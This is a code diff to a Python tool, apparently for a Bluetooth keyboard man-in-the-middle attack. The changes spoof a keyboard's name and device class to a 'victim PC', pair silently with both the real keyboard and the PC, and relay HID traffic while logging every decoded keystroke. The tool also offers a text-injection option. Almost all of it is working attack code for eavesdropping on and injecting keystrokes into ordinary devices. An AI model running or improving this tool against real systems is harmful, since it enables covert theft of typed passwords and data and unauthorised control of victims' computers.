@@ -286,22 +286,29 @@ def bt_setup_nino(hci: str = 'hci0') -> None:
     _run(['btmgmt', '-i', hci, 'power', 'on'])
     _run(['btmgmt', '-i', hci, 'connectable', 'on'])
 
-def bt_advertise_as_keyboard(hci):
-    _run(['btmgmt', '-i', hci, 'class', '0x002540']) # sets Class of Device to Peripheral/Keyboard -> for PC to see
-    _run(['btmgmt', '-i', hci, 'discoverable', 'on'])   # 3 = NoInputNoOutput
+def bt_advertise_as_keyboard(hci, name='X-KEY 38BT (2)'):
+    _run(['btmgmt', '-i', hci, 'name', name])             # spoof keyboard name so macOS shows keyboard icon
+    _run(['hciconfig', hci, 'class', '0x002540'])         # CoD: Peripheral/Keyboard (0x05 major, 0x40 minor, Limited Discoverable)
+    _run(['btmgmt', '-i', hci, 'discov', 'on'])          # make adapter discoverable (BlueZ 5.64+ syntax)
     _run(['btmgmt', '-i', hci, 'connectable', 'on'])
-    subprocess.run(['sdptool', 'add', '--handle', '0x00010001', 'HID'])
+    r = subprocess.run(['sdptool', 'add', 'KEYB'], capture_output=True, text=True)
+    if r.returncode == 0:
+        print('[PAIRING] SDP HID record registered')
+    else:
+        print(f'[PAIRING] WARN SDP HID register failed: {r.stderr.strip() or r.stdout.strip()}')
 
-def accept_pc_connection(timeout=60.0):
-    ctrl_server = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)                                                                                                   
-    ctrl_server.bind(("", HID_PSM_CONTROL))      # PSM 0x0011                                                                                                                  
+def accept_pc_connection(timeout=120.0):
+    ctrl_server = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)          
+    ctrl_server.setsockopt(274, 4, struct.pack("2B", 1, 0))                                                                                         
+    ctrl_server.bind(("00:00:00:00:00:00", HID_PSM_CONTROL))      # PSM 0x0011                                                                                                                  
     ctrl_server.listen(1)
     ctrl_server.settimeout(timeout)                                                                                                                                            
     pc_ctrl_sock, pc_addr = ctrl_server.accept()
     ctrl_server.close()                                                                                                                               
     
-    intr_server = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)                                                                                                   
-    intr_server.bind(("", HID_PSM_INTERRUPT))    # PSM 0x0013
+    intr_server = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)  
+    intr_server.setsockopt(274, 4, struct.pack("2B", 1, 0))                                                                                                  
+    intr_server.bind(("00:00:00:00:00:00", HID_PSM_INTERRUPT))    # PSM 0x0013
     intr_server.listen(1)                                                                                                                                                      
     intr_server.settimeout(timeout)
     pc_intr_sock, _ = intr_server.accept()
@@ -310,59 +317,27 @@ def accept_pc_connection(timeout=60.0):
     return (pc_ctrl_sock, pc_intr_sock, pc_addr)  
     
 
-def bt_connect(bt_addr: str) -> None:
-    """Trigger ACL connection + pairing to the keyboard via bluetoothctl."""
+def bt_connect(bt_addr: str, hci: str = 'hci0') -> None:
+    """Pair with keyboard via btmgmt (establishes ACL+link key without BlueZ
+    input plugin claiming the HID L2CAP channels)."""
     print(f'[PAIRING] Connecting to keyboard {bt_addr} ...')
+    # Use btmgmt pair (-t 0 = BR/EDR) so BlueZ does SSP but does NOT open
+    # HID profiles — that keeps PSM 0x11/0x13 free for our own L2CAP sockets.
     r = subprocess.run(
-        ['bluetoothctl', '--', 'connect', bt_addr],
-        capture_output=True, text=True, timeout=20,
+        ['btmgmt', '-i', hci, 'pair', '-t', '0', bt_addr],
+        capture_output=True, text=True, timeout=30,
     )
     out = r.stdout + r.stderr
-    if 'Connection successful' in out or r.returncode == 0:
+    if 'Pairing successful' in out or r.returncode == 0:
         print(f'[PAIRING] ACL + pairing to {bt_addr}: ok')
     else:
         # Non-fatal: the L2CAP connect below will surface the real error
-        print(f'[PAIRING] WARN bluetoothctl connect: {out.strip()[:200]}')
+        print(f'[PAIRING] WARN btmgmt pair: {out.strip()[:200]}')
 
 
 # ---------------------------------------------------------------------------
 # Relay loop: keyboard L2CAP interrupt → keystroke log + uhid forward
 # ---------------------------------------------------------------------------
-def relay_loop(
-    kb_intr_sock: socket.socket,
-    uhid_fd: int,
-    stop: threading.Event,
-) -> None:
-    kb_intr_sock.settimeout(1.0)
-    while not stop.is_set():
-        try:
-            raw = kb_intr_sock.recv(64)
-        except socket.timeout:
-            continue
-        except OSError as e:
-            print(f'[MITM] Relay socket error: {e}')
-            break
-
-        if not raw:
-            print('[MITM] Keyboard side closed connection')
-            break
-
-        # Strip HID-over-L2CAP header byte (0xA1 = DATA | INPUT) if present
-        report = raw[1:] if (raw[0] == HID_HEADER_DATA_INPUT) else raw
-
-        # Pad to full 8-byte boot keyboard format if needed
-        if len(report) < 8:
-            report = report + b'\x00' * (8 - len(report))
-
-        decoded = decode_hid_report(report)
-        if decoded:
-            print(f'[RELAY] KEY: {decoded}')
-
-        # Forward verbatim to PC side via uhid
-        uhid_send_report(uhid_fd, report[:8])
-
-    print('[MITM] Relay loop stopped')
-
 def relay_kb_to_pc(kb_intr_sock, pc_intr_sock, stop):
     kb_intr_sock.settimeout(1.0)
     while not stop.is_set():
@@ -390,7 +365,12 @@ def relay_kb_to_pc(kb_intr_sock, pc_intr_sock, stop):
             print(f'[RELAY] KEY: {decoded}')
 
         # Forward verbatim to PC side via pc_intr_sock
-        pc_intr_sock.send(b'\xA1' + report[:8])
+        data = b'\xA1' + report[:8]
+        n = pc_intr_sock.send(b'\xA1' + report[:8])
+        if n != len(data):                                                                                                             
+            print(f'[RELAY] SHORT SEND: sent {n}/{len(data)}')
+        else:                                                                                                                          
+            print(f'[RELAY] SENT OK: {data.hex()}')
 
     print('[MITM] Relay loop stopped')
 
@@ -403,6 +383,20 @@ def relay_pc_to_kb(pc_ctrl_sock, kb_ctrl_sock, stop):
             continue
         if raw:                                                                                                                                                                
             kb_ctrl_sock.send(raw)    # forward verbatim
+
+def relay_kb_ctrl_to_pc(kb_ctrl_sock, pc_ctrl_sock, stop):                                                                     
+    kb_ctrl_sock.settimeout(1.0)                                                                                               
+    while not stop.is_set():                
+        try:                                                                                                                   
+            raw = kb_ctrl_sock.recv(64)
+        except socket.timeout:                                                                                                 
+            continue
+        except OSError:                                                                                                        
+            break
+        print(f'[CTRL←KB] {raw.hex()}')
+        if raw:                             
+            pc_ctrl_sock.send(raw)      
+
 # ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
@@ -413,6 +407,8 @@ def main() -> int:
     parser.add_argument('--target',   required=True, metavar='BD_ADDR',
                         help='Keyboard Bluetooth address (AA:BB:CC:DD:EE:FF)')
     parser.add_argument('--hci',      default='hci0',     help='HCI device (default: hci0)')
+    parser.add_argument('--name',     default='X-KEY 38BT (FAKE)',
+                        help='Adapter name to advertise to victim PC (default: X-KEY 38BT)')
     parser.add_argument('--uhid-dev', default='/dev/uhid', help='uhid device path')
     parser.add_argument('--inject',   metavar='TEXT',
                         help='Inject TEXT after relay is established, then keep running')
@@ -423,7 +419,7 @@ def main() -> int:
     time.sleep(1)
 
     # ---- 2. CoD + SDP + discoverable to target PC -----------------------------
-    bt_advertise_as_keyboard(args.hci)
+    bt_advertise_as_keyboard(args.hci, args.name)
 
     # # ---- DEPRECATED 2. PC-facing side: virtual keyboard via uhid ----------------------
     # print(f'[MITM] Opening uhid at {args.uhid_dev}')
@@ -446,11 +442,30 @@ def main() -> int:
         daemon=True,
     )
     accept_pc_thread.start()
+
+    def _pair_on_connect(target_kb):
+      import re
+      hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
+      hci.bind((0,))
+      hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,
+                     struct.pack("IIIh2x", 0xffffffff, 0xffffffff, 0xffffffff, 0))
+      while True:
+          pkt = hci.recv(260)
+          if len(pkt) >= 14 and pkt[1] == 0x03 and pkt[3] == 0x00:   # HCI_EV_CONN_COMPLETE
+              addr = ':'.join(f'{b:02X}' for b in reversed(pkt[6:12]))
+              if addr.upper() != target_kb.upper():
+                  subprocess.Popen(['btmgmt', '-i', 'hci0', 'pair',
+                                    '-c', '3', '-t', '0', addr])
+                  break
+      hci.close()
+
+    threading.Thread(target=_pair_on_connect, args=(args.target,),
+                   daemon=True, name='pair_pc').start()
     print('[MITM] Waiting for PC to connect ...')
 
 
     # ---- 3. Keyboard-facing side: connect + open L2CAP --------------------
-    bt_connect(args.target)
+    bt_connect(args.target, args.hci)
     time.sleep(2)     # wait for ACL + SDP to settle
 
     print(f'[MITM] Opening HID Control channel  (PSM 0x{HID_PSM_CONTROL:04x})')
@@ -468,8 +483,8 @@ def main() -> int:
 
     print(f'[MITM] Session established with {args.target}')
 
-    pc_ctrl_sock, pc_intr_sock, pc_addr = pc_queue.get(timeout=60)
-    print(f'[MITM] PC connected from {pc_addr}')
+    pc_ctrl_sock, pc_intr_sock, pc_addr = pc_queue.get(timeout=120)
+    print(f'[MITM] PC connected from {pc_addr}, {pc_ctrl_sock}, {pc_intr_sock}')
 
     # ---- 4. Start relay thread --------------------------------------------
     stop_event = threading.Event()
@@ -487,6 +502,12 @@ def main() -> int:
         name='relay_pc_kb'
     )
     relay_pc_kb_thread.start()
+    relay_kb_ctrl_thread = threading.Thread(
+        target=relay_kb_ctrl_to_pc,                                                                                                
+        args=(kb_ctrl_sock, pc_ctrl_sock, stop_event),
+        daemon=True, name='relay_kb_ctrl'             
+    )                                           
+    relay_kb_ctrl_thread.start() 
     print('[MITM] Relay active — type on keyboard to see logged keystrokes')
 
     # ---- 5. Optional injection demo ----------------------------------------
@@ -504,6 +525,7 @@ def main() -> int:
     stop_event.set()
     relay_thread.join(timeout=3)
     relay_pc_kb_thread.join(timeout=3)
+    relay_kb_ctrl_thread.join(timeout=3)
 
     # ---- 7. Cleanup --------------------------------------------------------
     kb_intr_sock.close()
